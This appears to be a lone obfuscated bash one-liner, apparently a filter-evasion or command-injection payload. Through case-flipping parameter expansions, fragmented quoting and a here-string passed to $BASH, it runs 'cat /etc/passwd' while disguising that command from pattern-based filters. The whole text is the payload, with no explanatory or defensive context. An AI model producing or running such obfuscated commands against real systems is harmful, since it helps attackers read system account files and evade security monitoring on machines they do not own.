cmd=${*~~} $BASH ${*//%R/a}  <<<  "$(  G5='CAT /ETC/PASSWD'  ${*%i} ; ${*,}  p"r"""i'n'tf %s  "${G5~~}"  ; "${@,}"  )"
